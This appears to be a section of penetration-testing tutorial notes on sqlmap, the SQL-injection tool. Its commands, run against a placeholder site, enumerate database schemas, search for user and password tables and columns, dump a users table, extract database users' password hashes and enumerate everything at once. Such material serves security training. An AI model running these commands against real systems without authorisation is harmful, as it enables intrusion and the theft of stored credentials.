## **Advanced Database Enumeration**

**DB Schema Enumeration :** To view the structure of all databases and tables (database architecture), use:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Searching for Data**

When a database has many tables and columns, use `--search` to find names using the SQL LIKE operator.

**Search for tables :** Find tables containing the word user:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Search for columns :** Find columns containing pass:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

**Password Enumeration and Cracking**

After finding a table with passwords (e.g., `master.users`), dump it:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -D master -T users
```

**DB Users Password Enumeration**

Instead of dumping application tables, SQLMap can dump database users' password hashes using:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--passwords --batch
```

**`--all` Switch**

To automatically enumerate everything:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--all --batch
```
